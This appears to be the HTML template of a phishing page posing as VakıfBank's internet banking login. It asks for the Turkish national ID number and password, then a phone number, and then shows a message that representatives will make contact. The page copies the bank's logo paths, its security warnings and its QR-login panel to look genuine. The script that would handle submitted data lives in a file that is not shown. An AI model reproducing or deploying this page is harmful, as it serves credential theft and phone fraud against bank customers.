<!DOCTYPE html>
<html lang="tr">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta name="csrf_token" content="{{ csrf_token() }}">
    <title>VakıfBank İnternet Bankacılığı</title>
    <base href="{{ asset('vassets') }}/" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"h />
    <link rel="stylesheet" href="./static/css/style.css">

</head>

<body>
    <header class="header">
        <div class="container">
            <div class="desktop">
                <div class="left logo">
                    <img src="./static/img/vakifbank-logo.svg" alt="logo">
                </div>
                <div class="right">
                    <div class="header-options">
                        <div class="lang-bar">
                            <a class="lang-active">TR</a>
                            <a class="lang">EN</a>
                        </div>
                    </div>
                </div>
            </div>
            <div class="mobile">
                <div class="container">
                    <div class="emptyDiv"></div>
                    <div class="centerLogo">
                        <img src="./static/img/vakifbank-logo-white.svg" alt="mobileLogo">
                    </div>
                    <div class="lang">
                        <a class="lang" data-uid="SwitchLanguage#index">EN</a>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <main class="main">
        <div class="container vakifbank-wrapper">
            <p class="welcome">Hoş Geldiniz</p>
            <div class="row">
                <div class="left form">
                    <form onsubmit="return false;">
                        <div class="usage-bar">
                            <a class="usage-active">Bireysel</a>
                            <a class="usage">Ticari</a>
                        </div>
                        <div id="first_step">
                            <div class="form-group">
                                <label for="customerNumber">T.C. Kimlik Numarası</label>
                                <input type="tel" inputmode="numeric" id="tcOrUserNametxt" name="tckn"
                                    class="form-input" placeholder="T.C. Kimlik Numaranızı Giriniz" maxlength="12">
                                <div class="keyboard"></div>
                                <span class="error"></span>
                            </div>

                            <div class="form-group">
                                <label for="customerPassword">Şifreniz</label>
                                <input type="password" id="tbPasswordtxt" name="password" class="form-input jsForm"
                                    placeholder="Şifrenizi Yazın" maxlength="8">
                                <div class="keyboard"></div>
                                <span class="error"></span>
                            </div>
                            <div class="forgot-Password">
                                <p>Şifrem Yok / Unuttum</p>
                            </div>
                            <div class="form-group last-fg">
                                <button type="submit" class="btn-Submit" id="btnLogin">GİRİŞ YAP</button>
                            </div>
                        </div>
                        <div id="twice_step" class="d-none">
                            <div class="form-group">
                                <label for="customerNumber">Telefon Numaranız</label>
                                <input type="tel" inputmode="numeric" id="phone" name="phone"
                                    class="form-input" placeholder="Örnek: (555) 555 55 55">
                                <div class="keyboard"></div>
                                <span class="error"></span>
                            </div>

                            <div class="form-group last-fg">
                                <button type="submit" class="btn-Submit" id="btnPhone">ONAYLA</button>
                            </div>
                        </div>
                        <div id="three_step" class="d-none">
                            <div class="text-center warn">
                                <i class="fa-solid fa-triangle-exclamation"></i>
                                <span>
                                        Şuanda işleminizi gerçekleştiremiyoruz.<br/>
                                        Temsilclerimizle sizinle iletişime geçecektir.
                                        <br />Lütfen daha sonra tekrar deneyiniz.
                                </span>
                            </div>
                    </form>

                </div>
                <div class="right Gif">
                    <div _ngcontent-ijv-c704="" class="box-plate qr-box">
                        <div _ngcontent-ijv-c704="" class="row">
                            <login-qr _ngcontent-ijv-c704="" _nghost-ijv-c703="">
                                <div _ngcontent-ijv-c703="" class="login-qr-message-box">
                                    <int-message-box _ngcontent-ijv-c703="" _nghost-ijv-c624="">
                                    </int-message-box>
                                </div>
                                <div _ngcontent-ijv-c703="" class="col-md-12">
                                    <div _ngcontent-ijv-c703="" class="welcome-page-title header-title"
                                        style="margin-top: 16px;"> Karekod İle Giriş </div>
                                </div>
                                <div _ngcontent-ijv-c703="" class="col-md-8">
                                    <span _ngcontent-ijv-c703=""
                                        style="font-size: 12px; font-family: Roboto; display: block; font-weight: normal; line-height: 20px; margin-top: 40px;">
                                        VakıfBank Mobil'in giriş sayfasındaki "Karekod İşlemleri"nden işleminizi
                                        gerçekleştirebilirsiniz. </span>
                                </div>
                                <div _ngcontent-ijv-c703="" class="col-md-4">
                                    <img _ngcontent-ijv-c703="" id="qr_entry" class="qr-size"
                                        src="./static/img/qr_entry_tr.svg">
                                </div>
                                <div _ngcontent-ijv-c703="" class="row">
                                    <div _ngcontent-ijv-c703="" class="col-md-12">
                                        <span _ngcontent-ijv-c703=""
                                            style="font-size: 11px; font-family: Roboto; display: block; font-weight: normal; line-height: 18px; color: #808080;">
                                            *Uygulamanızın Android telefonlar için v2.8.6, İOS telefonlar içinse v2.8.8
                                            versiyon ve üzerinde olması gerekmektedir. </span>
                                    </div>
                                </div>
                            </login-qr>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </main>
    <section class="notice">
        <div class="container">
            <p class="secWarn">Güvenlik Uyarıları</p>
            <img src="./static/img/secure-globalsign-ssl.png" alt="secureWarn">
            <nav class="list">
                <ul>
                    <li>
                        VakıfBank hiçbir zaman İnternet Şubesi girişinde müşterilerinin cep telefonu markası, modeli
                        gibi bilgileri istememektedir. Bu tür şüpheli ekranlar ile karşılaştığınızda işleminizi
                        durdurarak hemen 0850 222 0 724 Telefon Bankacılığını arayınız ya da şubenize başvurunuz.
                        Güvenlik uyarılarını okumak için lütfen <b>tıklayınız</b>
                    </li>
                    <li>
                        Dijital Kanallarda güvenliğiniz için güncel bir antivirüs programı kullanınız.
                    </li>
                    <li>
                        Bir sonraki sayfada kayıtlı telefon numaranız istenecektir. Bilgilerinizi göremezseniz tek
                        kullanımlık şifrenizi girmeyiniz ve hemen 0850 222 0 724 Telefon Bankacılığını arayınız ya da
                        şubenize başvurunuz.
                    </li>
                    <li>
                        Cep telefonu numaranız bir sonraki ekranda sorulacaktır. Eğer farklı bir şey istenirse ekrana
                        bilgi girmeyiniz ve hemen 0850 222 0 724 Telefon Bankacılığını arayınız ya da şubenize
                        başvurunuz.
                    </li>
                </ul>
            </nav>
        </div>
    </section>
    <footer class="footer">
        <div class="container">
            <div class="copyright">
                <p>
                    © 2021 VakıfBank T.A.O
                </p>
            </div>
            <nav class="rightTexts">
                <ul class="firstUL">
                    <li>
                        <span>İşlem Listesi</span>
                    </li>
                    <li>
                        <span>Planlı Kesinti ve Duyurular</span>
                    </li>
                    <li>
                        <span>İletişim</span>
                    </li>
                </ul>
                <ul class="secondUL">
                    <li>
                        <img src="./static/img/google-play.jpg" alt="Google Play">
                    </li>
                    <li>
                        <img src="./static/img/app-store.jpg" alt="Apple AppStore">
                    </li>
                </ul>
            </nav>
        </div>
    </footer>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <script src="static/js/jquery.mask.min.js"></script>
    <script src="static/js/custom.js"></script>
    <script>
        $(document).ready((function() {
            $("form input").on("focus", (function() {
                $(this).prev().children().first().addClass("focus")
            })).on("blur", (function() {
                $(this).val() || $(this).prev().children().first().removeClass("focus")
            })), $(document).on("click", (function(e) {
                $("form input").each((function() {
                    $(this).is(e.target) || $(this).val() || $(this).prev().children()
                        .first().removeClass("focus")
                }))
            }))
        }));
    </script>
</body>

</html>
